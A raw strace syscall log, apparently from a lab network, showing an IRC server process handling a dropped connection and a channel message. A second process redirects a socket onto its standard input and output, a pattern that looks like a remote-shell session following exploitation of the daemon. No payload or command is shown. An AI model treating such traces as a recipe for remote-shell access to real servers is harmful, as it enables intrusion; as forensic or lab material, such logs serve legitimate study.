7696  07:19:58.529024 _llseek(6, 0, 0xbffa1020, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.529034 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
7696  07:19:58.529053 dup2(6, 1)        = 1
7696  07:19:58.529064 close(6)          = 0
7696  07:19:58.529075 fcntl64(1, F_SETFD, 0) = 0
7696  07:19:58.529085 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0fa8) = -1 EINVAL (Invalid argument)
7696  07:19:58.529095 _llseek(1, 0, 0xbffa0ff0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.529123 dup(8)            = 6
7696  07:19:58.529135 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0fd8) = -1 EINVAL (Invalid argument)
7696  07:19:58.529145 _llseek(6, 0, 0xbffa1020, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.529154 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
7696  07:19:58.529170 dup2(6, 0)        = 0
7696  07:19:58.529180 close(6)          = 0
7696  07:19:58.529189 fcntl64(0, F_SETFD, 0) = 0
7696  07:19:58.529202 fcntl64(0, F_SETFD, 0) = 0
7696  07:19:58.529216 read(0,  <unfinished ...>
4519  07:19:58.530003 <... select resumed> ) = 1 (in [5], left {0, 640000})
4519  07:19:58.530052 clock_gettime(CLOCK_MONOTONIC, {1608, 347065877}) = 0
4519  07:19:58.530067 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:19:58.530080 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:19:58.530116 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:19:58.530183 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:19:58.530268 close(5)          = 0
4519  07:19:58.530284 gettimeofday({1495624798, 530288}, NULL) = 0
4519  07:19:58.530297 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 720000})
4519  07:19:58.810149 clock_gettime(CLOCK_MONOTONIC, {1608, 627212743}) = 0
4519  07:19:58.810277 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:19:58.810343 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810382 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810410 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810435 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810451 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810466 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810479 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810493 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810507 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810521 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810534 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810548 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810562 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810575 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810597 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810611 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810624 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810638 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810652 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810666 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810679 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810693 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.810709 time(NULL)        = 1495624798
4519  07:19:58.810718 time(NULL)        = 1495624798
4519  07:19:58.810730 gettimeofday({1495624798, 810734}, NULL) = 0
4519  07:19:58.810779 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:19:58.810810 clock_gettime(CLOCK_MONOTONIC, {1608, 627823439}) = 0
4519  07:19:58.810835 gettimeofday({1495624798, 810838}, NULL) = 0
4519  07:19:58.810846 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
7696  07:19:59.045864 <... read resumed> "", 4096) = 0
7696  07:19:59.046008 close(8)          = 0
7696  07:19:59.046161 exit_group(0)     = ?
